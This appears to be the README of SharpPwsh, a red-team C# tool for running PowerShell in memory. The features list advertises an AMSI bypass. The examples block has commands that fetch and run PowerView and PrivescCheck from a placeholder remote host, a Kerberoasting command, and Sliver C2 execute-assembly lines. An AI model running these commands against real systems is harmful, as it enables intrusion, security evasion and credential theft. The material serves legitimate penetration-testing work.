# SharpPwsh
C# .Net Framework program that uses `RunspaceFactory` for Powershell command execution.

## Features
- Execute Powershell commands
- Load & execute remote script
- AMSI Bypass
- Multiple command & script support
- Encoded command support
- Load & execute script from clipboard

## Usage

```
SharpPwsh 1.0.0.0
Copyright c  2022

  -c, --cmd            Required. Powershell command to run

  -u, --uri            Fetch script from URI

  -p, --clipboard      Fetch script from clipboard

  -b, --bypass-amsi    Bypass AMSI

  -e, --encoded        Encodeded command (base64)

  --help               Display this help screen.

  --version            Display version information.
```

## Examples

```
# execute powershell command
PS > .\SharpPwsh.exe -c whoami

# execute base64 encoded powershell command
PS > .\SharpPwsh.exe -e -c d2hvYW1pCg==

# load script from clipboard and execute command
PS > .\SharpPwsh.exe -p -c Get-NetLocalGroup

# load remote script and execute
PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup

# load remote script and execute encoded command
PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -e -c R2V0LU5ldExvY2FsR3JvdXAK

# execute multiple powershell commands
PS > .\SharpPwsh.exe -c hostname,whoami

# execute multiple powershell commands using multiple scripts
PS > .\SharpPwsh.exe -c get-netlocalgroup,invoke-privesccheck -u http://x.x.x.x/PowerView.ps1,http://x.x.x.x/PrivescCheck.ps1 -b

# sliver inline & bypass AMSI + ETW
sliver > execute-assembly -M -E -i /tools/SharpPwsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1

# sliver BOF & bypass AMSI
sliver > inline-execute-assembly /tools/SharpPwsh.exe '-b -c invoke-kerberoast -u http://x.x.x.x/PowerView.ps1'
```

## Planned
- Load & execute embedded script
- Load & execute script from disk
- Compression & encryption support for scripts


## Build
Built using .NET Framework v4.5.1 in Visual Studio 2019.

Be sure to add `c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` as a reference.

The project uses [`dnMerge`](https://github.com/CCob/dnMerge) so it has to be compiled in `Release` mode.